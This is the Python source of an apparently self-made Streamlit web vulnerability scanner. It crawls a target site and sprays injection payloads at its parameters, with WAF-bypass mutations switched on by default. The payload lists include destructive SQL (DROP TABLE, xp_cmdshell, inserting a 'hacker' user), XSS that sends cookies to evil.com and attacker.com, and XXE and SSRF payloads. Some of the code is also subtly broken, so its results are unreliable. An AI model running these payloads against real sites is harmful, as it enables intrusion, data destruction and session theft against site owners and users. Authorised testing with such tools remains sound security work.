import streamlit as st
import requests
import re
import random
import time
import hashlib
import json
import threading
from collections import deque, defaultdict
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, quote, unquote
from concurrent.futures import ThreadPoolExecutor, as_completed, ProcessPoolExecutor
from dataclasses import dataclass, field
from typing import List, Dict, Set, Tuple, Optional
import numpy as np
from sklearn.feature_extraction.text import TfidfVectorizer
from sklearn.metrics.pairwise import cosine_similarity
import warnings
warnings.filterwarnings('ignore')

# ================= KONFIGURASI EXTREME =================
st.set_page_config(
    page_title="🔥 EXTREME AI SCANNER v3.0", 
    layout="wide",
    initial_sidebar_state="expanded"
)

# Advanced Configuration
MAX_THREADS = 20  # Lebih agresif
CRAWL_LIMIT = 200  # 10x lebih banyak
REQUEST_TIMEOUT = 3  # Lebih cepat
MAX_RETRIES = 5
RATE_LIMIT_DELAY = 0.1  # Minimal delay
USER_AGENTS_POOL = [
    f"Mozilla/5.0 (Windows NT {i}.0; Win64; x64) AppleWebKit/537.36" 
    for i in range(6, 11)
] + [
    f"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_{i}_7) AppleWebKit/537.36"
    for i in range(12, 16)
] * 10

# Payload Database (100+ payloads)
SQLI_PAYLOADS = [
    # Classic
    "' OR '1'='1", "' OR 1=1--", "' OR 1=1#", "1' ORDER BY 1--", 
    "1' UNION SELECT NULL--", "' UNION SELECT @@version--",
    # Time-based
    "' OR SLEEP(5)--", "' WAITFOR DELAY '00:00:05'--",
    # Boolean
    "' AND 1=1--", "' AND 1=2--", "' AND 'a'='a",
    # Advanced
    "admin'--", "1' AND (SELECT * FROM users) IS NOT NULL--",
    "' OR EXISTS(SELECT 1 FROM users)--",
    # Second-order
    "'; INSERT INTO users VALUES('hacker','pass')--",
    "' OR 1=1; DROP TABLE users--",
    # MSSQL
    "1'; EXEC xp_cmdshell('dir')--",
    # PostgreSQL
    "1'; SELECT pg_sleep(5)--",
    # MySQL
    "1' AND (SELECT * FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--",
]

XSS_PAYLOADS = [
    # Classic
    "<script>alert(1)</script>", "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>", "javascript:alert(1)",
    # Advanced
    "<body onload=alert(1)>", "<input onfocus=alert(1) autofocus>",
    "<iframe src=javascript:alert(1)>", "<details open ontoggle=alert(1)>",
    # Polyglot
    "jaVasCript:alert(1)", "\"><script>alert(1)</script>",
    "'><img src=x onerror=alert(1)>", "';alert(1);//",
    # DOM Based
    "<script>document.location='http://evil.com?cookie='+document.cookie</script>",
    "<script>fetch('http://attacker.com?c='+document.cookie)</script>",
]

PATH_TRAVERSAL = [
    "../../../etc/passwd", "..\\..\\..\\windows\\win.ini",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd",
    "....//....//....//etc/passwd",
    "..;/..;/..;/etc/passwd",
]

XXE_PAYLOADS = [
    '''<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>''',
    '''<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://attacker.com/xxe">%remote;]><root/>''',
]

SSRF_PAYLOADS = [
    "http://169.254.169.254/latest/meta-data/",  # AWS Metadata
    "http://127.0.0.1:8080/admin",
    "http://localhost:22",
    "file:///etc/passwd",
]

NOSQL_PAYLOADS = [
    '{"$ne": null}', '{"$gt": ""}', '{"$regex": ".*"}',
    "' || '1'=='1", "' && this.password.match(/.*/)//",
]

# ================= DATA CLASSES =================
@dataclass
class Vulnerability:
    url: str
    param: str
    payload: str
    vuln_type: str
    severity: str  # CRITICAL, HIGH, MEDIUM, LOW
    confidence: float  # 0-1
    evidence: str
    response_time: float
    status_code: int
    response_size: int

@dataclass
class ScanResult:
    target: str
    vulnerabilities: List[Vulnerability] = field(default_factory=list)
    crawled_urls: List[str] = field(default_factory=list)
    parameters_found: List[str] = field(default_factory=list)
    scan_time: float = 0
    total_requests: int = 0
    waf_detected: bool = False
    tech_stack: Dict = field(default_factory=dict)

# ================= ADVANCED WAF DETECTION =================
class WAFDetector:
    def __init__(self):
        self.waf_signatures = {
            "Cloudflare": ["cf-ray", "cloudflare", "__cfduid"],
            "AWS WAF": ["x-amzn-RequestId", "aws-waf"],
            "ModSecurity": ["Mod_Security", "NOYB"],
            "Sucuri": ["sucuri", "x-sucuri-id"],
            "Imperva": ["x-iinfo", "incap_ses"],
            "F5": ["X-WA-Info", "bigip"],
        }
    
    def detect(self, response: requests.Response) -> Tuple[bool, List[str]]:
        detected = []
        headers_lower = {k.lower(): v.lower() for k, v in response.headers.items()}
        
        for waf_name, signatures in self.waf_signatures.items():
            for sig in signatures:
                if sig in str(headers_lower) or sig in response.text.lower():
                    detected.append(waf_name)
                    break
        
        return len(detected) > 0, detected

# ================= TECHNOLOGY STACK DETECTION =================
class TechDetector:
    def __init__(self):
        self.tech_patterns = {
            "PHP": ["php", ".php", "PHPSESSID"],
            "ASP.NET": [".aspx", "ASP.NET", "ViewState"],
            "Java": [".jsp", "JSESSIONID", "java"],
            "Python": ["python", "django", "flask", "wsgi"],
            "Node.js": ["node", "express", "x-powered-by: express"],
            "WordPress": ["wp-content", "wp-includes", "wordpress"],
            "Drupal": ["drupal", "sites/default"],
            "Joomla": ["joomla", "com_content"],
            "React": ["_next", "react", "__NEXT_DATA__"],
            "Angular": ["ng-app", "angular", "ng-version"],
        }
    
    def detect(self, response: requests.Response, html: str) -> Dict:
        detected = {}
        headers_lower = {k.lower(): v.lower() for k, v in response.headers.items()}
        
        for tech, patterns in self.tech_patterns.items():
            confidence = 0
            for pattern in patterns:
                if pattern.lower() in html.lower():
                    confidence += 0.3
                for k, v in headers_lower.items():
                    if pattern.lower() in v or pattern.lower() in k:
                        confidence += 0.4
            if confidence > 0:
                detected[tech] = min(confidence, 1.0)
        
        return detected

# ================= INTELLIGENT CRAWLER =================
class IntelligentCrawler:
    def __init__(self, start_url: str, max_urls: int = 200):
        self.start_url = start_url
        self.max_urls = max_urls
        self.visited = set()
        self.to_visit = deque([start_url])
        self.domain = urlparse(start_url).netloc
        self.session = requests.Session()
        self.js_urls = set()
        self.api_endpoints = set()
        self.forms = []
        
    def extract_js_files(self, html: str, base_url: str) -> List[str]:
        """Extract JavaScript files for deeper analysis"""
        js_patterns = [
            r'<script[^>]+src=["\'](.*?\.js)[^>]*>',
            r'<link[^>]+href=["\'](.*?\.js)[^>]*>',
        ]
        js_files = set()
        for pattern in js_patterns:
            for match in re.finditer(pattern, html, re.IGNORECASE):
                js_url = urljoin(base_url, match.group(1))
                js_files.add(js_url)
        return list(js_files)
    
    def extract_api_endpoints(self, html: str, js_content: str = "") -> Set[str]:
        """Extract API endpoints from HTML and JS"""
        endpoints = set()
        patterns = [
            r'["\'](/api/[^"\']*)["\']',
            r'["\'](/v\d+/[^"\']*)["\']',
            r'["\'](/rest/[^"\']*)["\']',
            r'["\'](/graphql)[^"\']*["\']',
            r'fetch\(["\']([^"\']*)["\']',
            r'axios\.(get|post)\(["\']([^"\']*)["\']',
        ]
        
        for pattern in patterns:
            for match in re.finditer(pattern, html + js_content, re.IGNORECASE):
                endpoint = match.group(1) if len(match.groups()) > 1 else match.group(0)
                if endpoint.startswith(('/', 'http')):
                    endpoints.add(endpoint)
        
        return endpoints
    
    def extract_forms(self, html: str, base_url: str) -> List[Dict]:
        """Extract and analyze HTML forms"""
        forms = []
        form_pattern = r'<form[^>]*>(.*?)</form>'
        
        for form_match in re.finditer(form_pattern, html, re.IGNORECASE | re.DOTALL):
            form_html = form_match.group(0)
            form_data = {
                'action': '',
                'method': 'GET',
                'inputs': [],
                'url': base_url
            }
            
            # Extract action
            action_match = re.search(r'action=["\']([^"\']*)["\']', form_html, re.IGNORECASE)
            if action_match:
                form_data['action'] = urljoin(base_url, action_match.group(1))
                form_data['url'] = form_data['action']
            
            # Extract method
            method_match = re.search(r'method=["\']([^"\']*)["\']', form_html, re.IGNORECASE)
            if method_match:
                form_data['method'] = method_match.group(1).upper()
            
            # Extract inputs
            input_pattern = r'<input[^>]*name=["\']([^"\']*)["\'][^>]*>'
            for input_match in re.finditer(input_pattern, form_html, re.IGNORECASE):
                form_data['inputs'].append(input_match.group(1))
            
            forms.append(form_data)
        
        return forms
    
    def crawl(self) -> ScanResult:
        """Advanced crawling with JS and API discovery"""
        result = ScanResult(target=self.start_url)
        headers = {'User-Agent': random.choice(USER_AGENTS_POOL)}
        
        while self.to_visit and len(self.visited) < self.max_urls:
            current_url = self.to_visit.popleft()
            
            if current_url in self.visited:
                continue
            
            self.visited.add(current_url)
            result.crawled_urls.append(current_url)
            
            try:
                response = self.session.get(
                    current_url, 
                    timeout=REQUEST_TIMEOUT,
                    headers=headers,
                    allow_redirects=True
                )
                
                # Extract content
                html = response.text
                
                # Find JS files
                js_files = self.extract_js_files(html, current_url)
                for js_url in js_files:
                    self.js_urls.add(js_url)
                
                # Find API endpoints
                api_endpoints = self.extract_api_endpoints(html)
                self.api_endpoints.update(api_endpoints)
                
                # Find forms
                forms = self.extract_forms(html, current_url)
                self.forms.extend(forms)
                
                # Extract all links
                links = re.findall(r'href=["\'](.*?)["\']', html)
                for link in links:
                    full_url = urljoin(current_url, link)
                    parsed = urlparse(full_url)
                    
                    if (parsed.netloc == self.domain and 
                        parsed.scheme in ['http', 'https'] and
                        full_url not in self.visited):
                        self.to_visit.append(full_url)
                
                # Rate limiting
                time.sleep(RATE_LIMIT_DELAY)
                
            except Exception as e:
                continue
        
        # Add discovered JS endpoints as URLs to scan
        for js_url in self.js_urls:
            result.crawled_urls.append(js_url)
        
        for api_url in self.api_endpoints:
            full_api = urljoin(self.start_url, api_url)
            result.crawled_urls.append(full_api)
        
        return result

# ================= AI-PAYLOAD GENERATOR =================
class AIPayloadGenerator:
    def __init__(self):
        self.mutations = [
            self.case_variation,
            self.encoding_variation,
            self.comment_injection,
            self.whitespace_mutation,
        ]
    
    def case_variation(self, payload: str) -> str:
        """Generate case variations"""
        variations = []
        if '<script>' in payload.lower():
            variations.extend([
                payload.replace('<script>', '<ScRiPt>'),
                payload.replace('<script>', '<SCRIPT>'),
            ])
        return variations
    
    def encoding_variation(self, payload: str) -> str:
        """Generate encoded versions"""
        variations = []
        variations.append(quote(payload))
        variations.append(payload.encode('utf-8').hex())
        variations.append(''.join([f'%{ord(c):02x}' for c in payload]))
        return variations
    
    def comment_injection(self, payload: str) -> str:
        """Add SQL comments to bypass filters"""
        if 'OR' in payload.upper():
            return payload.replace('OR', 'OR/**/')
        return payload
    
    def whitespace_mutation(self, payload: str) -> str:
        """Mutate whitespace to bypass WAF"""
        return payload.replace(' ', '\t').replace(' ', '\n')
    
    def generate(self, base_payloads: List[str]) -> List[str]:
        """Generate mutated payloads"""
        all_payloads = set(base_payloads)
        
        for payload in base_payloads[:20]:  # Limit mutations
            for mutation in self.mutations:
                try:
                    mutated = mutation(payload)
                    if isinstance(mutated, list):
                        all_payloads.update(mutated)
                    elif mutated:
                        all_payloads.add(mutated)
                except:
                    pass
        
        return list(all_payloads)

# ================= BEHAVIORAL ANALYSIS =================
class BehavioralAnalyzer:
    def __init__(self):
        self.baseline_behavior = {}
        self.anomaly_threshold = 0.7
    
    def analyze_response_behavior(self, response: requests.Response) -> Dict:
        """Extract behavioral features from response"""
        features = {
            'status_code': response.status_code,
            'response_time': response.elapsed.total_seconds(),
            'content_length': len(response.text),
            'header_count': len(response.headers),
            'error_indicators': 0,
            'redirect_count': len(response.history),
        }
        
        # Check for error indicators
        error_patterns = ['error', 'exception', 'warning', 'fatal', 'sql', 'syntax']
        for pattern in error_patterns:
            if pattern in response.text.lower():
                features['error_indicators'] += 1
        
        return features
    
    def detect_anomaly(self, baseline: Dict, current: Dict) -> Tuple[float, List[str]]:
        """Detect anomalies using behavioral analysis"""
        anomalies = []
        anomaly_score = 0
        
        # Status code change
        if baseline['status_code'] != current['status_code']:
            anomaly_score += 0.3
            anomalies.append(f"Status code changed: {baseline['status_code']} -> {current['status_code']}")
        
        # Response time anomaly (3x slower)
        if current['response_time'] > baseline['response_time'] * 3:
            anomaly_score += 0.4
            anomalies.append(f"Response time spike: {baseline['response_time']:.2f}s -> {current['response_time']:.2f}s")
        
        # Content length anomaly (50% change)
        len_ratio = current['content_length'] / max(baseline['content_length'], 1)
        if len_ratio > 1.5 or len_ratio < 0.5:
            anomaly_score += 0.3
            anomalies.append(f"Content size changed by {abs(1-len_ratio)*100:.0f}%")
        
        # Error indicators
        if current['error_indicators'] > baseline['error_indicators']:
            anomaly_score += 0.2 * current['error_indicators']
            anomalies.append(f"New error indicators detected")
        
        return min(anomaly_score, 1.0), anomalies

# ================= EXTREME SCANNER =================
class ExtremeScanner:
    def __init__(self, target: str):
        self.target = target
        self.session = requests.Session()
        self.waf_detector = WAFDetector()
        self.tech_detector = TechDetector()
        self.payload_generator = AIPayloadGenerator()
        self.behavioral_analyzer = BehavioralAnalyzer()
        self.results = ScanResult(target=target)
        self.baseline_responses = {}
        
    def test_waf_bypass(self, url: str, param: str, original_payload: str) -> List[Vulnerability]:
        """Test WAF bypass techniques"""
        vulnerabilities = []
        bypass_payloads = self.payload_generator.generate([original_payload])
        
        for payload in bypass_payloads[:10]:  # Limit bypass attempts
            test_url = f"{url}?{param}={quote(str(payload))}"
            
            try:
                response = self.session.get(test_url, timeout=REQUEST_TIMEOUT)
                
                # Analyze response
                if response.status_code != 403 and response.status_code != 406:  # Not blocked
                    score, anomalies = self.behavioral_analyzer.detect_anomaly(
                        self.baseline_responses.get(url, {}),
                        self.behavioral_analyzer.analyze_response_behavior(response)
                    )
                    
                    if score > 0.6:
                        vuln = Vulnerability(
                            url=url,
                            param=param,
                            payload=str(payload)[:100],
                            vuln_type=self.classify_payload(original_payload),
                            severity=self.calculate_severity(score, anomalies),
                            confidence=score,
                            evidence="; ".join(anomalies[:3]),
                            response_time=response.elapsed.total_seconds(),
                            status_code=response.status_code,
                            response_size=len(response.text)
                        )
                        vulnerabilities.append(vuln)
            except:
                pass
        
        return vulnerabilities
    
    def classify_payload(self, payload: str) -> str:
        """Classify payload type"""
        payload_lower = payload.lower()
        if any(x in payload_lower for x in ['select', 'union', 'sleep', 'waitfor']):
            return "SQL Injection"
        elif any(x in payload_lower for x in ['script', 'alert', 'onerror']):
            return "Cross-Site Scripting (XSS)"
        elif any(x in payload_lower for x in ['../', '..\\', 'etc/passwd']):
            return "Path Traversal"
        elif any(x in payload_lower for x in ['xml', 'doctype', 'entity']):
            return "XXE Injection"
        elif any(x in payload_lower for x in ['$ne', '$gt', '$regex']):
            return "NoSQL Injection"
        else:
            return "Generic Injection"
    
    def calculate_severity(self, score: float, anomalies: List[str]) -> str:
        """Calculate vulnerability severity"""
        if score > 0.9 or any('sql' in a.lower() for a in anomalies):
            return "CRITICAL"
        elif score > 0.7:
            return "HIGH"
        elif score > 0.5:
            return "MEDIUM"
        else:
            return "LOW"
    
    def scan_parameter(self, url: str, param: str) -> List[Vulnerability]:
        """Scan single parameter with all payload types"""
        findings = []
        
        all_payloads = (
            SQLI_PAYLOADS + XSS_PAYLOADS + 
            PATH_TRAVERSAL + XXE_PAYLOADS + 
            SSRF_PAYLOADS + NOSQL_PAYLOADS
        )
        
        for payload in all_payloads[:50]:  # Limit per parameter
            test_url = f"{url}?{param}={quote(payload)}"
            
            try:
                response = self.session.get(test_url, timeout=REQUEST_TIMEOUT)
                
                # Behavioral analysis
                current_behavior = self.behavioral_analyzer.analyze_response_behavior(response)
                anomaly_score, anomalies = self.behavioral_analyzer.detect_anomaly(
                    self.baseline_responses.get(url, {}),
                    current_behavior
                )
                
                if anomaly_score > 0.5:
                    # Test WAF bypass for promising payloads
                    bypass_findings = self.test_waf_bypass(url, param, payload)
                    findings.extend(bypass_findings)
                    
                    vuln = Vulnerability(
                        url=url,
                        param=param,
                        payload=payload[:100],
                        vuln_type=self.classify_payload(payload),
                        severity=self.calculate_severity(anomaly_score, anomalies),
                        confidence=anomaly_score,
                        evidence="; ".join(anomalies[:3]),
                        response_time=response.elapsed.total_seconds(),
                        status_code=response.status_code,
                        response_size=len(response.text)
                    )
                    findings.append(vuln)
                    
            except:
                pass
        
        return findings
    
    def scan(self) -> ScanResult:
        """Main scanning orchestration"""
        start_time = time.time()
        
        # Phase 1: Crawl and discover
        st.write("### 🌐 Phase 1: Intelligent Crawling")
        crawler = IntelligentCrawler(self.target, max_urls=CRAWL_LIMIT)
        crawl_result = crawler.crawl()
        self.results.crawled_urls = crawl_result.crawled_urls
        self.results.parameters_found = crawl_result.parameters_found
        
        # Phase 2: Baseline establishment
        st.write("### 📊 Phase 2: Establishing Baseline")
        progress_bar = st.progress(0)
        status_text = st.empty()
        
        for idx, url in enumerate(self.results.crawled_urls[:50]):  # Limit baseline URLs
            try:
                response = self.session.get(url, timeout=REQUEST_TIMEOUT)
                self.baseline_responses[url] = self.behavioral_analyzer.analyze_response_behavior(response)
                
                # Detect WAF and tech stack on first URL
                if idx == 0:
                    self.results.waf_detected, waf_list = self.waf_detector.detect(response)
                    self.results.tech_stack = self.tech_detector.detect(response, response.text)
            except:
                pass
            
            progress_bar.progress((idx + 1) / len(self.results.crawled_urls[:50]))
        
        # Phase 3: Parameter Discovery
        st.write("### 🔍 Phase 3: Parameter Discovery")
        all_params = set()
        for url in self.results.crawled_urls[:30]:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            all_params.update(params.keys())
        
        # Phase 4: Aggressive Scanning
        st.write("### ⚡ Phase 4: Aggressive Vulnerability Scanning")
        vulnerabilities = []
        
        with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
            futures = []
            for url in self.results.crawled_urls[:100]:  # Limit scan URLs
                for param in list(all_params)[:20]:  # Limit parameters
                    futures.append(executor.submit(self.scan_parameter, url, param))
            
            for i, future in enumerate(as_completed(futures)):
                vulnerabilities.extend(future.result())
                progress_bar.progress((i + 1) / len(futures))
                status_text.text(f"Found {len(vulnerabilities)} potential vulnerabilities...")
        
        self.results.vulnerabilities = vulnerabilities
        self.results.scan_time = time.time() - start_time
        self.results.total_requests = len(self.results.crawled_urls) * len(all_params) * 50
        
        return self.results

# ================= UI COMPONENTS =================
def display_results(results: ScanResult):
    """Enhanced results display"""
    
    # Summary Cards
    col1, col2, col3, col4, col5 = st.columns(5)
    
    with col1:
        st.metric("🔍 URLs Scanned", len(results.crawled_urls))
    with col2:
        st.metric("💣 Vulnerabilities", len(results.vulnerabilities))
    with col3:
        st.metric("⏱️ Scan Time", f"{results.scan_time:.2f}s")
    with col4:
        st.metric("📡 Total Requests", f"{results.total_requests:,}")
    with col5:
        severity_count = defaultdict(int)
        for v in results.vulnerabilities:
            severity_count[v.severity] += 1
        st.metric("🔥 Critical", severity_count.get("CRITICAL", 0))
    
    # WAF & Tech Stack
    if results.waf_detected:
        st.warning("🛡️ **WAF Detected** - Some results may be false positives")
    
    if results.tech_stack:
        with st.expander("🖥️ Detected Technology Stack"):
            st.json(results.tech_stack)
    
    # Vulnerabilities Table
    if results.vulnerabilities:
        st.write("## 🎯 Vulnerability Report")
        
        # Group by severity
        for severity in ["CRITICAL", "HIGH", "MEDIUM", "LOW"]:
            vulns = [v for v in results.vulnerabilities if v.severity == severity]
            if vulns:
                with st.expander(f"{severity} Severity ({len(vulns)})", expanded=(severity in ["CRITICAL", "HIGH"])):
                    for v in vulns:
                        if severity == "CRITICAL":
                            st.error(f"""
                            **📍 URL:** `{v.url}`  
                            **🔧 Parameter:** `{v.param}`  
                            **💉 Payload:** `{v.payload}`  
                            **🎯 Type:** {v.vuln_type}  
                            **📊 Confidence:** {v.confidence:.1%}  
                            **🔍 Evidence:** {v.evidence}  
                            **⏱️ Response Time:** {v.response_time:.3f}s  
                            **📄 Status:** {v.status_code}
                            """)
                        elif severity == "HIGH":
                            st.warning(f"""
                            **URL:** `{v.url}` | **Param:** `{v.param}` | **Type:** {v.vuln_type}  
                            **Payload:** `{v.payload}` | **Confidence:** {v.confidence:.1%}
                            """)
                        else:
                            st.info(f"`{v.url}` → `{v.param}`: {v.vuln_type} (confidence: {v.confidence:.1%})")
    else:
        st.success("🎉 No significant vulnerabilities found!")
    
    # Export options
    if results.vulnerabilities:
        st.download_button(
            label="📥 Export Results (JSON)",
            data=json.dumps([vars(v) for v in results.vulnerabilities], indent=2),
            file_name=f"scan_results_{int(time.time())}.json",
            mime="application/json"
        )

# ================= MAIN =================
def main():
    # Custom CSS
    st.markdown("""
    <style>
    .big-font { font-size:20px !important; font-weight: bold; }
    .critical { color: #ff0000; }
    .high { color: #ff6600; }
    </style>
    """, unsafe_allow_html=True)
    
    st.title("🔥 ULTRA EXTREME AI SCANNER v3.0")
    st.markdown("*Advanced Vulnerability Scanner with AI-Powered Payload Generation*")
    
    # Sidebar configuration
    with st.sidebar:
        st.header("⚙️ Configuration")
        aggressive_mode = st.checkbox("🚀 Aggressive Mode", value=True)
        deep_crawl = st.checkbox("🕸️ Deep Crawl (JS + API)", value=True)
        waf_bypass = st.checkbox("🛡️ WAF Bypass Techniques", value=True)
        
        st.header("🎯 Target Scope")
        target = st.text_input("Target URL", placeholder="https://example.com")
        
        st.header("⚠️ Legal Notice")
        st.warning("""
        **Only scan websites you own or have explicit permission to test!  
        Unauthorized scanning is illegal.**
        """)
    
    if st.button("🔥 START EXTREME SCAN", type="primary", use_container_width=True):
        if not target:
            st.error("Please enter a target URL")
            return
        
        if not target.startswith(("http://", "https://")):
            target = "https://" + target
        
        # Initialize scanner
        scanner = ExtremeScanner(target)
        
        # Run scan
        try:
            results = scanner.scan()
            
            # Display results
            display_results(results)
            
            # Performance metrics
            st.success(f"""
            ✅ Scan completed in {results.scan_time:.2f} seconds  
            📊 Scanned {len(results.crawled_urls)} URLs with {results.total_requests} total requests  
            🎯 Found {len(results.vulnerabilities)} potential vulnerabilities
            """)
            
        except Exception as e:
            st.error(f"Scan failed: {str(e)}")
            st.info("Try a different target or reduce scan intensity")

if __name__ == "__main__":
    main()
